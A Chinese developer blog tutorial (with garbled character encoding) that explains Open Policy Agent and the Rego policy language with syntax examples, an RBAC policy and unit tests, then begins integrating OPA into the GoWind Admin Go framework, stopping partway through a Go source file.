                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šOPA é›†æˆæŒ‡å—ï¼šä»åŸç†åˆ°å®è·µ</h2>
<p>Open Policy Agentï¼ˆç®€ç§° OPAï¼‰æ˜¯ä¸€æ¬¾å¼€æºçš„é€šç”¨ç­–ç•¥å¼•æ“ï¼Œæ ¸å¿ƒä»·å€¼åœ¨äºå®ç°â€œç­–ç•¥å³ä»£ç â€ï¼ˆPolicy as Codeï¼‰ï¼Œå°†åˆ†æ•£åœ¨å„ç³»ç»Ÿä¸­çš„æƒé™æ§åˆ¶ã€èµ„æºè®¿é—®è§„åˆ™ç­‰ç­–ç•¥é€»è¾‘æŠ½ç¦»å‡ºæ¥ï¼Œè¿›è¡Œç»Ÿä¸€ç®¡ç†ã€ç‰ˆæœ¬æ§åˆ¶ä¸æ‰§è¡Œã€‚å¦‚ä»Šï¼ŒOPA å·²æˆä¸ºäº‘åŸç”Ÿç”Ÿæ€ä¸­ç­–ç•¥ç®¡æ§çš„äº‹å®æ ‡å‡†ï¼Œè¢« Netflixã€Cloudflareã€Pinterestã€Chef ç­‰å·¨å¤´å¹¿æ³›åº”ç”¨â€”â€”ä»å†…éƒ¨ API æƒé™ç®¡æ§ã€Kubernetes é›†ç¾¤èµ„æºè°ƒåº¦ï¼Œåˆ°ç»ˆç«¯äº§å“çš„ IAM åŠŸèƒ½å®ç°ï¼Œå‡èƒ½çœ‹åˆ°å…¶èº«å½±ã€‚</p>
<p>OPA ç”± Styra å…¬å¸äº 2016 å¹´å¼€æºï¼Œ2018 å¹´åŠ å…¥ CNCFï¼ˆäº‘åŸç”Ÿè®¡ç®—åŸºé‡‘ä¼šï¼‰æˆä¸ºæ²™ç®±é¡¹ç›®ï¼Œ2021 å¹´ 2 æœˆæ­£å¼æ¯•ä¸šï¼Œå…¶å¿«é€Ÿæ™‹å‡çš„èƒŒåï¼Œæ˜¯ç¤¾åŒºçš„é«˜åº¦æ´»è·ƒä¸è¡Œä¸šå¯¹ç»Ÿä¸€ç­–ç•¥ç®¡æ§éœ€æ±‚çš„è¿«åˆ‡æ€§ã€‚æœ¬æ–‡å°†ä» OPA æ ¸å¿ƒåŸç†ã€Rego è¯­è¨€å…¥é—¨ï¼Œé€æ­¥æ·±å…¥åˆ° GoWind Admin ä¼ä¸šçº§ä¸­åå°æ¡†æ¶çš„å®Œæ•´é›†æˆæµç¨‹ï¼Œå¸®åŠ©å¼€å‘è€…å¿«é€Ÿè½åœ°æƒé™ç®¡æ§èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€æ·±å…¥ç†è§£ OPAï¼šæ ¸å¿ƒåŸç†ä¸æ ¸å¿ƒæ¦‚å¿µ</h3>
<p>åœ¨é›†æˆ OPA ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå˜æ¸…å…¶æ ¸å¿ƒé€»è¾‘ï¼šOPA ä¸å…³å¿ƒâ€œè°åœ¨è®¿é—®â€ï¼ˆè®¤è¯ï¼ŒAuthenticationï¼‰ï¼Œåªä¸“æ³¨äºâ€œèƒ½å¦è®¿é—®â€ï¼ˆæˆæƒï¼ŒAuthorizationï¼‰åŠæ›´å¹¿æ³›çš„ç­–ç•¥å†³ç­–ï¼ˆå¦‚èµ„æºéƒ¨ç½²è§„åˆ™ã€ç½‘ç»œè·¯ç”±é™åˆ¶ç­‰ï¼‰ã€‚å®ƒé€šè¿‡æ¥æ”¶è¾“å…¥ã€ç»“åˆå¤–éƒ¨æ•°æ®ã€æ‰§è¡Œé¢„å®šä¹‰ç­–ç•¥ï¼Œæœ€ç»ˆè¾“å‡ºå†³ç­–ç»“æœï¼Œå®ç°ç­–ç•¥ä¸ä¸šåŠ¡ç³»ç»Ÿçš„è§£è€¦ã€‚</p>
<h4 data-id="heading-2">1.1 æ ¸å¿ƒæ¦‚å¿µï¼šå››å¤§æ ¸å¿ƒè¦ç´ </h4>
<p>å®è§‚ä¸Šï¼ŒOPA çš„å†³ç­–è¿‡ç¨‹ä¾èµ–å››ä¸ªæ ¸å¿ƒè¦ç´ ï¼Œå››è€…æ„æˆå®Œæ•´çš„ç­–ç•¥æ‰§è¡Œé—­ç¯ï¼Œåœ¨ OPA å®˜æ–¹è¯•ç‚¼åœºï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fplay.openpolicyagent.org" target="_blank" title="https://play.openpolicyagent.org" ref="nofollow noopener noreferrer">play.openpolicyagent.org</a>ï¼‰ä¸­å¯ç›´è§‚éªŒè¯å…¶äº¤äº’é€»è¾‘ï¼š</p>
<ul>
<li><strong>è¯·æ±‚è¾“å…¥ï¼ˆRequest Inputï¼‰</strong>ï¼šè§¦å‘ç­–ç•¥å†³ç­–çš„è¯·æ±‚æ•°æ®ï¼Œé€šå¸¸åŒ…å«è®¿é—®ä¸»ä½“ã€è®¿é—®èµ„æºã€è®¿é—®æ“ä½œç­‰å…³é”®ä¿¡æ¯ï¼Œæ ¼å¼ä¸º JSONã€‚</li>
<li><strong>å¤–éƒ¨æ•°æ®ï¼ˆDataï¼‰</strong>ï¼šç­–ç•¥æ‰§è¡Œæ‰€éœ€çš„è¡¥å……æ•°æ®ï¼ˆéè¯·æ±‚è‡ªå¸¦ï¼‰ï¼Œå¦‚ç”¨æˆ·è§’è‰²åˆ—è¡¨ã€èµ„æºæƒé™æ˜ å°„è¡¨ç­‰ï¼Œå¯é€šè¿‡ OPA çš„æ•°æ® API åŠ¨æ€æ³¨å…¥ã€‚</li>
<li><strong>Rego ç­–ç•¥ï¼ˆPolicyï¼‰</strong>ï¼šä½¿ç”¨ OPA ä¸“ç”¨çš„å£°æ˜å¼ DSL è¯­è¨€ Rego ç¼–å†™çš„ç­–ç•¥è§„åˆ™ï¼Œå®šä¹‰â€œä½•ç§æ¡ä»¶ä¸‹å…è®¸/æ‹’ç»æŸä¸ªæ“ä½œâ€ã€‚</li>
<li><strong>å“åº”æ•°æ®ï¼ˆResponseï¼‰</strong>ï¼šç­–ç•¥æ‰§è¡Œåçš„å†³ç­–ç»“æœï¼Œå¯æ˜¯ç®€å•çš„ true/falseï¼ˆå…è®¸/æ‹’ç»ï¼‰ï¼Œä¹Ÿå¯æ˜¯å¤æ‚çš„ JSON ç»“æ„ï¼ˆå¦‚è¿”å›å…è®¸çš„èµ„æºåˆ—è¡¨ã€æ‹’ç»åŸå› ç­‰ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-3">1.2 å¾®è§‚è§†è§’ï¼šè¯·æ±‚è¾“å…¥çš„ä¸‰å…ƒç»„æ¨¡å‹</h4>
<p>ä»»ä½•è®¿é—®æ§åˆ¶ç±»çš„ç­–ç•¥å†³ç­–ï¼Œå…¶è¾“å…¥æœ¬è´¨ä¸Šéƒ½å¯æŠ½è±¡ä¸ºâ€œä¸»ä½“-èµ„æº-æ“ä½œâ€çš„ä¸‰å…ƒç»„æ¨¡å‹ï¼š</p>
<ol>
<li>è®¿é—®å®ä½“ï¼ˆSubjectï¼‰ï¼šå‘èµ·è®¿é—®çš„ä¸»ä½“ï¼Œå¦‚ç”¨æˆ· IDã€è§’è‰²ã€ç”¨æˆ·ç»„ç­‰ï¼›</li>
<li>è®¿é—®èµ„æºï¼ˆObjectï¼‰ï¼šè¢«è®¿é—®çš„å¯¹è±¡ï¼Œå¦‚ API æ¥å£ã€æ•°æ®åº“è¡¨ã€K8s èµ„æºç­‰ï¼›</li>
<li>è®¿é—®æ–¹æ³•ï¼ˆActionï¼‰ï¼šå…·ä½“çš„æ“ä½œç±»å‹ï¼Œå¦‚ HTTP çš„ GET/POST/PUT/DELETEï¼Œæˆ–æ•°æ®åº“çš„æŸ¥è¯¢/ä¿®æ”¹ç­‰ã€‚</li>
</ol>
<p>è¿™ä¸€æ¨¡å‹ä¸ Casbin é«˜åº¦ç›¸ä¼¼ï¼Œä½†ä¸¤è€…æ ¸å¿ƒå·®å¼‚åœ¨äºç­–ç•¥æè¿°èƒ½åŠ›ï¼šCasbin é‡‡ç”¨ç®€æ´çš„è¡¨è¾¾å¼æ¨¡å‹ï¼Œé€‚åˆç®€å•æƒé™åœºæ™¯ï¼›è€Œ OPA çš„ Rego ä½œä¸ºå®Œæ•´çš„ DSL è¯­è¨€ï¼Œæ”¯æŒå¤æ‚çš„é€»è¾‘åˆ¤æ–­ã€æ•°æ®è½¬æ¢ã€å‡½æ•°è°ƒç”¨ï¼Œèƒ½åº”å¯¹ä¼ä¸šçº§å¤æ‚ç­–ç•¥éœ€æ±‚ï¼ˆå¦‚å¤šç»´åº¦æƒé™å åŠ ã€åŠ¨æ€æ•°æ®å…³è”æ ¡éªŒç­‰ï¼‰ã€‚</p>
<h3 data-id="heading-4">äºŒã€Rego è¯­è¨€å…¥é—¨ï¼šä»åŸºç¡€è¯­æ³•åˆ°å®Œæ•´è§„åˆ™</h3>
<p>Rego æ˜¯ OPA çš„æ ¸å¿ƒï¼Œä¸“ä¸ºç­–ç•¥ç¼–å†™è®¾è®¡ï¼Œå…·æœ‰å£°æ˜å¼ã€æ˜“è¯»æ˜“å†™çš„ç‰¹ç‚¹ã€‚å®ƒçµæ„Ÿæºè‡ª Datalog æŸ¥è¯¢è¯­è¨€ï¼Œæ‰©å±•äº†å¯¹ JSON ç»“æ„åŒ–æ•°æ®çš„æ”¯æŒï¼Œå¯è½»æ¾å¤„ç†åµŒå¥—å¯¹è±¡ã€æ•°ç»„ç­‰å¸¸è§æ•°æ®æ ¼å¼ã€‚ä»¥ä¸‹ä»æ ¸å¿ƒè¯­æ³•å…¥æ‰‹ï¼Œé€æ­¥æ„å»ºå®Œæ•´çš„ç­–ç•¥è§„åˆ™ã€‚</p>
<h4 data-id="heading-5">2.1 åŸºç¡€è¯­æ³•ï¼šå˜é‡ä¸èµ‹å€¼</h4>
<p>Rego ä¸­çš„å˜é‡ä¸€æ—¦èµ‹å€¼ä¾¿ä¸å¯ä¿®æ”¹ï¼ˆä¸å¯å˜å˜é‡ï¼‰ï¼Œæ”¯æŒæ ‡é‡ã€å¤åˆç±»å‹ï¼ˆå¯¹è±¡ã€æ•°ç»„ã€é›†åˆï¼‰ç­‰å¤šç§æ•°æ®ç±»å‹ï¼Œèµ‹å€¼ä½¿ç”¨ <code>:=</code> ç¬¦å·ï¼š</p>
<pre><code class="hljs language-rego" lang="rego"># æ ‡é‡èµ‹å€¼ï¼šå­—ç¬¦ä¸²ã€æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¸ƒå°”å€¼ã€ç©ºå€¼
greeting   := "Hello"
max_height := 42
pi         := 3.14159
allowed    := true
location   := null

# å¤åˆç±»å‹èµ‹å€¼
rect := {"width": 2, "height": 4}  # å¯¹è±¡ï¼šé”®å€¼å¯¹é›†åˆ
allowed_users := ["papaya", "potato"]  # æ•°ç»„ï¼šæœ‰åºå…ƒç´ é›†åˆ
ips_by_port := {  # åµŒå¥—å¯¹è±¡ï¼šé”®ä¸ºæ•´æ•°ï¼Œå€¼ä¸ºæ•°ç»„
    80: ["1.1.1.1", "1.1.1.2"],
    443: ["2.2.2.1"],
}
</code></pre>
<h4 data-id="heading-6">2.2 é€»è¾‘åˆ¤æ–­ï¼šæ¡ä»¶ä¸å†³ç­–å—</h4>
<p>Rego çš„ç­–ç•¥è§„åˆ™æœ¬è´¨æ˜¯â€œæ¡ä»¶åˆ¤æ–­â€ï¼Œé€šè¿‡ <code>if</code> å…³é”®å­—æˆ–çœç•¥ <code>if</code> çš„å†³ç­–å—å®šä¹‰â€œä½•æ—¶æ»¡è¶³ç­–ç•¥â€ã€‚æ ¸å¿ƒé€»è¾‘è¿ç®—ç¬¦æ”¯æŒ <code>==</code>ã€<code>!=</code>ã€<code>&gt;</code>ã€<code>&lt;</code> ç­‰ï¼Œé€»è¾‘å…³ç³»é€šè¿‡è¯­æ³•ç»“æ„è¡¨è¾¾ï¼š</p>
<pre><code class="hljs language-rego" lang="rego"># åŸºç¡€æ¡ä»¶åˆ¤æ–­ï¼ˆä¸¤ç§å†™æ³•ç­‰ä»·ï¼‰
v if "hello" == "world"  # æ¡ä»¶ä¸æ»¡è¶³ï¼Œv ä¸º false
t2 if {                  # å¤šè¡Œå†³ç­–å—ï¼Œå†…éƒ¨è¯­å¥éœ€å…¨éƒ¨æ»¡è¶³
    x := 42
    y := 41
    x &gt; y                # æ¡ä»¶æ»¡è¶³ï¼Œt2 ä¸º true
}

# çœç•¥ if å…³é”®å­—çš„ç®€æ´å†™æ³•ï¼ˆæ¨èï¼‰
v { "hello" == "world" }  # ç­‰ä»·äºä¸Šè¿° v çš„å®šä¹‰
t2 {
    x := 42
    y := 41
    x &gt; y
}

# é€»è¾‘ ANDï¼šåˆ†å·åˆ†éš”æˆ–å¤šè¡Œåˆ†éš”ï¼ˆä¸¤ç§å†™æ³•ç­‰ä»·ï¼‰
# éœ€åŒæ—¶æ»¡è¶³â€œæœåŠ¡å™¨IDä¸ºappâ€å’Œâ€œåè®®ä¸ºhttpsâ€
valid_server {
    input.servers[0].id == "app"
    input.servers[0].protocols[0] == "https"
}
# ç­‰ä»·äºï¼šinput.servers[0].id == "app"; input.servers[0].protocols[0] == "https"

# é€»è¾‘ ORï¼šå¤šä¸ªåŒåå†³ç­–å—ï¼ˆä»»ä¸€æ»¡è¶³å³å¯ï¼‰
# æ»¡è¶³â€œæ˜¯ç®¡ç†å‘˜â€æˆ–â€œç«¯ç‚¹å…¬å¼€â€å³å…è®¸è®¿é—®
allow {
    is_admin
}
allow {
    is_endpoint_public
}
</code></pre>
<h4 data-id="heading-7">2.3 è¿­ä»£éå†ï¼šsome ä¸ every</h4>
<p>Rego æä¾›<code>some</code>ï¼ˆå­˜åœ¨æ€§éå†ï¼‰å’Œ <code>every</code>ï¼ˆå…¨ç§°éå†ï¼‰å…³é”®å­—ï¼Œç”¨äºå¤„ç†æ•°ç»„ã€å¯¹è±¡ç­‰å¯è¿­ä»£æ•°æ®ï¼Œæ”¯æŒç´¢å¼•<code>+</code>å€¼çš„åŒé‡éå†ï¼Œä¹Ÿå¯é€šè¿‡ä¸‹åˆ’çº¿ <code>_</code> å¿½ç•¥æ— å…³æ•°æ®ï¼š</p>
<pre><code class="hljs language-rego" lang="rego"># 1. æ•°ç»„éå†ï¼šsome å…³é”®å­—
arr := [1, 2, 3]
has_even {
    some val in arr  # éå†æ•°ç»„ä¸­çš„å€¼
    val % 2 == 0     # å­˜åœ¨å¶æ•°å³æ»¡è¶³
}

# 2. ç´¢å¼•+å€¼éå†
has_index_1 {
    some i, val in arr  # i ä¸ºç´¢å¼•ï¼Œval ä¸ºå¯¹åº”å€¼
    i == 1 &amp;&amp; val == 2  # ç´¢å¼•1å¯¹åº”å€¼ä¸º2å³æ»¡è¶³
}

# 3. å¯¹è±¡éå†ï¼ševery å…³é”®å­—ï¼ˆæ‰€æœ‰å…ƒç´ éœ€æ»¡è¶³æ¡ä»¶ï¼‰
valid_obj {
    every k, v in {"foo": "bar", "fox": "baz"} {
        startswith(k, "f")  # æ‰€æœ‰é”®ä»¥få¼€å¤´
        startswith(v, "b")  # æ‰€æœ‰å€¼ä»¥bå¼€å¤´
    }
}

# 4. é€šé…ç¬¦ _ï¼šå¿½ç•¥æ— å…³æ•°æ®
get_project_id {
    proj = input.projects[_]  # å–ä»»æ„ä¸€ä¸ªé¡¹ç›®
    id := proj.id             # è·å–é¡¹ç›®ID
}
</code></pre>
<h4 data-id="heading-8">2.4 å‡½æ•°å®šä¹‰ï¼šè‡ªå®šä¹‰ç­–ç•¥é€»è¾‘</h4>
<p>Rego æ”¯æŒè‡ªå®šä¹‰å‡½æ•°ï¼Œç”¨äºå°è£…å¯å¤ç”¨çš„ç­–ç•¥é€»è¾‘ï¼Œæ ¸å¿ƒç‰¹ç‚¹ï¼š</p>
<ul>
<li>é»˜è®¤è¿”å› <code>true/false</code>ï¼Œä¹Ÿå¯æ˜¾å¼æŒ‡å®šè¿”å›å€¼ï¼›</li>
<li>æ”¯æŒåŒåå‡½æ•°é‡è½½ï¼Œä½†å‚æ•°æ•°é‡å¿…é¡»ä¸€è‡´ï¼›</li>
<li>è¾“å…¥ç›¸åŒåˆ™è¾“å‡ºå¿…ç›¸åŒï¼ˆçº¯å‡½æ•°ç‰¹æ€§ï¼Œç¡®ä¿ç­–ç•¥æ‰§è¡Œçš„ä¸€è‡´æ€§ï¼‰ã€‚</li>
</ul>
<pre><code class="hljs language-rego" lang="rego"># 1. æ— è¿”å›å€¼å‡½æ•°ï¼ˆé»˜è®¤è¿”å›true/falseï¼‰
# åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºé…ç½®æ–‡ä»¶ï¼ˆæ»¡è¶³ä»»ä¸€åç¼€å³è¿”å›trueï¼‰
is_config_file(str) {
  contains(str, ".yaml")
}
is_config_file(str) {
  contains(str, ".yml")
}
is_config_file(str) {
  contains(str, ".json")
}

# 2. ç”¨ else åˆå¹¶åŒåå‡½æ•°ï¼ˆç­‰ä»·äºä¸Šè¿°å†™æ³•ï¼Œæ›´ç®€æ´ï¼‰
is_config_file2(str) {
  contains(str, ".yaml")
} else {
  contains(str, ".yml")
} else {
  contains(str, ".json")
}

# 3. æ˜¾å¼è¿”å›å€¼å‡½æ•°
# è‡ªå®šä¹‰åŠ æ³•å‡½æ•°ï¼Œè¿”å› a + b çš„ç»“æœ
plus_custom(a, b) := c {
    c := a + b
}
out := plus_custom(42, 43)  # out ç»“æœä¸º 85
</code></pre>
<h4 data-id="heading-9">2.5 å®Œæ•´ç­–ç•¥ç¤ºä¾‹ï¼šRBAC æƒé™æ§åˆ¶</h4>
<p>ç»“åˆä¸Šè¿°è¯­æ³•ï¼Œæˆ‘ä»¬å®ç°ä¸€ä¸ªç»å…¸çš„ RBACï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰ç­–ç•¥ï¼Œå®šä¹‰â€œGET è¯·æ±‚æ”¾è¡Œã€ç®¡ç†å‘˜åŠç®¡ç†å‘˜ç»„ç”¨æˆ·å…¨æ”¾è¡Œâ€çš„è§„åˆ™ï¼š</p>
<pre><code class="hljs language-rego" lang="rego">package authz  # å®šä¹‰ç­–ç•¥åŒ…ï¼ˆç±»ä¼¼å‘½åç©ºé—´ï¼Œé¿å…å†²çªï¼‰

default allow = false  # é»˜è®¤æ‹’ç»æ‰€æœ‰è®¿é—®

# è§„åˆ™1ï¼šæ”¾è¡Œæ‰€æœ‰ GET è¯·æ±‚
allow {
    input.method == "GET"
}

# è§„åˆ™2ï¼šå…è®¸ admin ç”¨æˆ·æ‰§è¡Œä»»ä½•æ“ä½œ
allow {
    input.user == "admin"
}

# è§„åˆ™3ï¼šå…è®¸ admin ç”¨æˆ·ç»„ä¸­çš„ç”¨æˆ·æ‰§è¡Œä»»ä½•æ“ä½œ
allow {
    input.group[_] == "admin"  # éå†ç”¨æˆ·ç»„ï¼Œå­˜åœ¨adminå³æ»¡è¶³
}
</code></pre>
<h5 data-id="heading-10">ç­–ç•¥æµ‹è¯•</h5>
<p>è¾“å…¥ä»¥ä¸‹è¯·æ±‚æ•°æ®ï¼ˆæ¨¡æ‹Ÿç”¨æˆ· <code>user1</code> å±äº <code>dev</code> å’Œ <code>admin</code> ç»„ï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"user"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"user1"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"group"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"dev"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"admin"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>OPA æ‰§è¡Œåè¾“å‡ºå†³ç­–ç»“æœï¼ˆæ»¡è¶³è§„åˆ™3ï¼Œå…è®¸è®¿é—®ï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-11">2.6 å•å…ƒæµ‹è¯•ï¼šç¡®ä¿ç­–ç•¥æ­£ç¡®æ€§</h4>
<p>Rego åŸç”Ÿæ”¯æŒå•å…ƒæµ‹è¯•ï¼Œæµ‹è¯•æ–‡ä»¶å‘½åéœ€éµå¾ª <code>xxx_test.rego</code> è§„èŒƒï¼ˆä¸ Go è¯­è¨€ä¸€è‡´ï¼‰ï¼Œé€šè¿‡ <code>with</code> å…³é”®å­—æ¨¡æ‹Ÿè¾“å…¥æ•°æ®ï¼ŒéªŒè¯ç­–ç•¥æ˜¯å¦ç¬¦åˆé¢„æœŸã€‚</p>
<h5 data-id="heading-12">æµ‹è¯•ç¤ºä¾‹</h5>
<p>åˆ›å»ºæµ‹è¯•æ–‡ä»¶<code>authz_test.rego</code>ï¼š</p>
<pre><code class="hljs language-rego" lang="rego">package authz  # ä¸è¢«æµ‹ç­–ç•¥åŒ…ä¸€è‡´
import future.keywords  # å¼•å…¥æœªæ¥å…³é”®å­—ï¼ˆå¯é€‰ï¼Œå¢å¼ºè¯­æ³•å…¼å®¹æ€§ï¼‰

# æµ‹è¯•ç”¨ä¾‹1ï¼šGET è¯·æ±‚åº”è¢«å…è®¸
test_get_allowed if {
    allow with input as {"user": "user1", "method": "GET"}
}

# æµ‹è¯•ç”¨ä¾‹2ï¼šadmin ç”¨æˆ·åº”è¢«å…è®¸
test_admin_allowed if {
    allow with input as {"user": "admin", "method": "POST"}
}

# æµ‹è¯•ç”¨ä¾‹3ï¼šé admin é GET è¯·æ±‚åº”è¢«æ‹’ç»
test_non_admin_non_get_denied if {
    not allow with input as {"user": "user2", "method": "POST", "group": ["dev"]}
}
</code></pre>
<h5 data-id="heading-13">æ‰§è¡Œæµ‹è¯•</h5>
<p>åœ¨ç­–ç•¥æ–‡ä»¶æ‰€åœ¨ç›®å½•æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹æµ‹è¯•ç»“æœï¼š</p>
<pre><code class="hljs language-shell" lang="shell">opa test . -v  # -v æ˜¾ç¤ºè¯¦ç»†æµ‹è¯•æ—¥å¿—
</code></pre>
<h5 data-id="heading-14">æµ‹è¯•è¾“å‡ºï¼ˆæˆåŠŸç¤ºä¾‹ï¼‰ï¼š</h5>
<pre><code class="hljs language-shell" lang="shell">authz_test.rego:
data.authz.test_get_allowed: PASS (522.5Âµs)
data.authz.test_admin_allowed: PASS (310.2Âµs)
data.authz.test_non_admin_non_get_denied: PASS (285.7Âµs)
--------------------------------------------------------------------------------
PASS: 3/3
</code></pre>
<h3 data-id="heading-15">ä¸‰ã€GoWind Admin é›†æˆ OPA å®Œæ•´æ­¥éª¤</h3>
<p>GoWind Admin å·²å°† OPA æ ¸å¿ƒé€»è¾‘å°è£…è‡³ &lt;github.com/tx7do/kratos-authz&gt; ç»„ä»¶ä¸­ï¼Œå¼€å‘è€…æ— éœ€é‡å¤å®ç°å¼•æ“åˆå§‹åŒ–ã€ç­–ç•¥åŠ è½½ç­‰åº•å±‚é€»è¾‘ï¼Œåªéœ€æŒ‰ä»¥ä¸‹æ­¥éª¤å®Œæˆé…ç½®ã€ä¾èµ–æ³¨å…¥ä¸ä¸­é—´ä»¶é›†æˆï¼Œå³å¯å¿«é€Ÿå¯ç”¨ OPA æƒé™ç®¡æ§ã€‚</p>
<h4 data-id="heading-16">3.1 æ ¸å¿ƒå°è£…ï¼šå®ç° Authorizer æƒé™ç®¡ç†å™¨</h4>
<p>é¦–å…ˆåœ¨ <code>app/admin/service/internal/data/authorizer.go</code> ä¸­å®ç°æƒé™ç®¡ç†å™¨ï¼Œå°è£… OPA å¼•æ“åˆå§‹åŒ–ã€ç­–ç•¥é‡ç½®ï¼ˆä»æ•°æ®åº“åŠ è½½è§’è‰²-API æƒé™æ˜ å°„ï¼‰ç­‰æ ¸å¿ƒèƒ½åŠ›ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// app/admin/service/internal/data/authorizer.go</span>

<span class="hljs-keyword">package</span> data

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"errors"</span>

	<span class="hljs-string">"github.com/go-kratos/kratos/v2/log"</span>

	authzEngine <span class="hljs-string">"github.com/tx7do/kratos-authz/engine"</span>
	<span class="hljs-string">"github.com/tx7do/kratos-authz/engine/casbin"</span>
	<span class="hljs-string">"github.com/tx7do/kratos-authz/engine/noop"</span>

	pagination <span class="hljs-string">"github.com/tx7do/go-crud/api/gen/go/pagination/v1"</span>
	<span class="hljs-string">"github.com/tx7do/go-utils/trans"</span>
	conf <span class="hljs-string">"github.com/tx7do/kratos-bootstrap/api/gen/go/conf/v1"</span>

	<span class="hljs-string">"go-wind-admin/app/admin/service/cmd/server/assets"</span>

	adminV1 <span class="hljs-string">"go-wind-admin/api/gen/go/admin/service/v1"</span>
	userV1 <span class="hljs-string">"go-wind-admin/api/gen/go/user/service/v1"</span>
)

<span class="hljs-comment">// Authorizer æƒé™ç®¡ç†å™¨</span>
